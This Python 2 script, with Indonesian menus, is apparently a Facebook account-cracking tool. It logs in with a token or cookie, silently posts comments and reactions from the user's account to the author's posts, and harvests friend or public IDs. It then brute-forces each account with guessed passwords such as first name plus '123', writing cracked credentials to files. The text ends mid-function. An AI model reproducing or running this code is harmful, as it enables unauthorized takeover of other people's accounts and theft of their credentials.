#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # ungu
O = '\033[1;96m' # biru muda

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 Crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;91m.', '\033[1;94m.', '\033[1;91m.', '\033[1;94m.']):
        if done:
            break
        sys.stdout.write('\r\033[1;94mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def keluar():
	print "\033[1;97m(\033[1;91m!\033[1;97m) Keluar"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
#########LOGO#########

logo = """
\033[1;94m _________   ________.    
\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m(\033[1;94m M\033[1;97m )\033[1;94m > \033[1;97mMulti 
\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m(\033[1;94m B\033[1;97m )\033[1;94m > \033[1;97mBrute
\033[1;94m \     \____|  |   | \_\ \ \033[1;97m(\033[1;94m F\033[1;97m )\033[1;94m > \033[1;97mForce
\033[1;94m  \______  /|__|   |___  /
\033[1;94m         \/            \/    \033[1;93m`\033[1;92m_/==\_\033[1;93m`
\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mAuthor   \033[1;94m• \033[1;97mMUHAMAD BADRU WASIH  \033[1;92m(°\033[1;97m ͜\033[1;92mʖ\033[1;92m°)\033[1;94m▄︻̷̿┻̿═━一
\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mFacebook \033[1;94m• \033[1;97mMUHAMAD BADRU WASIH   \033[1;92m/`>    \
\033[1;97m
(\033[1;94m•\033[1;97m) \033[1;97mWhatsAp  \033[1;94m• \033[1;97m08237164818×
\033[1;94m─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─
\033[1;94m•\033[1;97mJangan Lupa Kunjungi Kami
\033[1;94m•\033[1;97mWhatsApps : 0881-1403-654
\033[1;94m•\033[1;97mFacebook : MUHAMAD BADRU WASIH
\033[1;94m•\033[1;97mYoutube   : BANG BADRU

logo2 = """
\033[1;95m     ____ 
\033[1;95m    / __ \__  ______ ___  ____  \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti 
\033[1;95m   / / / / / / / __ `__ \/ __ \ \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute 
\033[1;95m  / /_/ / /_/ / / / / / / /_/ / \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce 
\033[1;95m /_____/\__,_/_/ /_/ /_/ .___/ 
\033[1;95m                      /_/      
 """   
 
logo3 = """
\033[1;95m ╦ ╦┌─┐┌─┐┬┬    ┌─┐┬─┐┌─┐┌─┐┬┌─ \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti 
\033[1;95m ╠═╣├─┤└─┐││    │  ├┬┘├─┤│  ├┴┐ \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute 
\033[1;95m ╩ ╩┴ ┴└─┘┴┴─┘  └─┘┴└─┴ ┴└─┘┴ ┴ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce 
 """   
 
 
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
idteman = []
idfromteman = []



###### MASUK ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m(\033[1;97m1\033[1;97m) Login Via Token Facebook"
	print "\033[1;97m(\033[1;97m2\033[1;97m) Login Via Cookie Facebook"
	print "\033[1;97m(\033[1;97m3\033[1;97m) Cara Ambil Cookie Facebook"
	print "\033[1;97m(\033[1;91m0\033[1;97m) Keluar"
	print 50* "\033[1;94m─"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m(?) Pilih \033[94m>\033[1;97m ")
	if msuk =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2"or msuk =="02":
		cookie()
	elif msuk =="3"or msuk =="03":
		ambil_cookie()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_masuk()
			
#### LOGIN_TOKEN ####
def tokenz():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	toket = raw_input("\033[1;97m(?) Token \033[94m>\033[1;97m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print ' '
		jalan ('\033[1;97m(\033[1;92m✓\033[1;97m)\033[1;92m Login Berhasil ! ')
		os.system('xdg-open ')
		bot_komen()
	except KeyError:
		print "\033[1;97m(\033[1;91m!\033[1;97m) Token salah !"
		time.sleep(1.7)
		masuk()
		
#### LOGIN COOKIES ####
def cookie():
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	cookie = raw_input("\033[1;97m(?) Cookie \033[94m>\033[1;97m ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] No Connection"
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	print ' '
	jalan ('\033[1;97m(\033[1;92m✓\033[1;97m)\033[1;92m Login Berhasil ! ')
	os.system('xdg-open ')
	bot_komen()
	time.sleep(2)
	menu()
	
	
###### BOT KOMEN #######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
	kom = ('Gw Pake Sc Lu Bang 😘')
	reac = ('LOVE')
	post = ('100006230836266')
	post2 = ('2880018022215864')
	kom2 = ('Mantap Bang 😁')
	reac2 = ('ANGRY')
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
	
###### MENU #######
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print "\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi"
		keluar()
	os.system("clear")
	print " "
	print "\033[1;94m _________   ________.    "
	print "\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;94m  \______  /|__|   |___  /"
	print "\033[1;94m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m─────────────\033[1;97m(\033[1;93mInformasi Profil Anda\033[1;97m)\033[1;94m──────────────"
	print 50* "\033[1;94m─"
	jalan("\033[1;97m(\033[1;94m•\033[1;97m)\033[1;97m Nama Akun\033[1;97m :\033[1;97m " +nama)
	jalan("\033[1;97m(\033[1;94m•\033[1;97m)\033[1;97m User Id\033[1;97m   :\033[1;97m " + id)
	jalan("\033[0;97m(\033[0;94m•\033[0;97m)\033[0;97m Tanggal Lahir\033[0;97m :\033[0;97m "+ a['birthday'])
	print 50* "\033[1;94m─"
	print "\033[1;94m──────────────────────\033[1;97m(\033[1;93mMenu\033[1;97m)\033[1;94m──────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mPilih Negara "
	print "\033[1;94m(\033[1;97m2\033[1;94m) \033[1;97mCrack ID Dari Postingan Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m) \033[1;97mCrack ID Dari Total Followers"
	print "\033[1;94m(\033[1;97m4\033[1;94m)\033[1;97m Cari ID menggunakan username"
	print "\033[1;94m(\033[1;97m5\033[1;94m) \033[1;97mDump ID"
	print "\033[1;94m(\033[1;97m6\033[1;94m) \033[1;97mLihat Hasil Crack"
	print "\033[1;94m(\033[1;97m7\033[1;94m) \033[1;97mFollow My Facebook"
	print "\033[1;94m(\033[1;97m8\033[1;94m)\033[1;97m Perbarui Script"
	print "\033[1;94m(\033[1;91m0\033[1;94m)\033[1;97m Keluar"
	print 50* "\033[1;94m─"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m(?) Pilih \033[94m>\033[1;97m ")
	if unikers =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih()
	elif unikers =="1" or unikers =="01":
		crack_teman()
	elif unikers =="2" or unikers =="02":
		crack_likes()
	elif unikers =="3" or unikers =="03":
		crack_follow()
	elif unikers =="4" or unikers =="04":
		user_id()
	elif unikers =="5" or unikers =="05":
		dump()
	elif unikers =="6" or unikers =="06":
		lihat_hasil()
	elif unikers =="7" or unikers =="07":
		follow()
	elif unikers =="8" or unikers =="08":
		perbarui()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Keluar')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print " "
	print "\033[1;94m _________   ________.    "
	print "\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;94m  \______  /|__|   |___  /"
	print "\033[1;94m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m──────────────────\033[1;97m(\033[1;93mPilih Negara\033[1;97m)\033[1;94m──────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m)\033[1;97m Crack ID Indonesia"
	print "\033[1;94m(\033[1;97m2\033[1;94m) \033[1;97mCrack ID Bangladesh"
	print "\033[1;94m(\033[1;97m3\033[1;94m) \033[1;97mCrack ID Usa"
	print "\033[1;94m(\033[1;97m4\033[1;94m)\033[1;97m Crack ID Pakistan & India"
	print "\033[1;94m(\033[1;97m5\033[1;94m) \033[1;97mCrack ID Malaysia"
	print "\033[1;94m(\033[1;97m6\033[1;94m) \033[1;97mCrack ID Thailand"
	print "\033[1;94m(\033[1;97m7\033[1;94m) \033[1;97mCrack ID Korea"
	print "\033[1;94m(\033[1;97m8\033[1;94m) \033[1;97mCrack ID Japan (Kakek Sugiono)"
	print "\033[1;94m(\033[1;97m9\033[1;94m)\033[1;97m Crack ID Singapura"
	print "\033[1;94m(\033[1;97m10\033[1;94m) \033[1;97mCrack ID Vietnam"
	print "\033[1;94m(\033[1;97m11\033[1;94m) \033[1;97mCrack ID Israel"
	print "\033[1;94m(\033[1;97m12\033[1;94m) \033[1;97mCrack ID Fhilipina"
	print "\033[1;94m(\033[1;97m13\033[1;94m) \033[1;97mCrack ID Prancis"
	print "\033[1;94m(\033[1;97m14\033[1;94m) \033[1;97mCrack ID Turky"
	print "\033[1;94m(\033[1;97m15\033[1;94m) \033[1;97mCrack ID Saudi Arabia"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_teman()
	
######PILIH######
def pilih_teman():
	univ = raw_input("\033[1;97m(?) Pilih \033[94m>\033[1;97m ")
	if univ =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_teman()
	elif univ =="1" or univ =="01":
		crack_indo()
	elif univ =="2" or univ =="02":
		crack_bangla()
	elif univ =="3" or univ =="03":
		crack_usa()
	elif univ =="4" or univ =="04":
		crack_pakis()
	elif univ =="5" or univ =="05":
		crack_malay()
	elif univ =="6" or univ =="06":
		crack_thai()
	elif univ =="7" or univ =="07":
		crack_korea()
	elif univ =="8" or univ =="08":
		crack_japan()
	elif univ =="9" or univ =="09":
		crack_singa()
	elif univ =="10" or univ =="10":
		crack_viet()
	elif univ =="11" or univ =="11":
		crack_israel()
	elif univ =="12" or univ =="12":
		crack_fhilip()
	elif univ =="13" or univ =="13":
		crack_prancis()
	elif univ =="14" or univ =="14":
		crack_turkey()
	elif univ =="15" or univ =="15":
		crack_saudi()
	elif univ =="0" or univ =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_teman()
		
##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;91m _________   ________.    "
	print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;97m  \______  /|__|   |___  /"
	print "\033[1;97m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m───────────────────\033[1;97m(\033[1;93mIndonesia\033[1;97m)\033[1;94m────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK INDONESIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK INDONESIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK INDONESIA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_indo()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/indo.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/indo.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/indo.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/indo.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/indo.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/indo.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('Sayang')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/indo.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
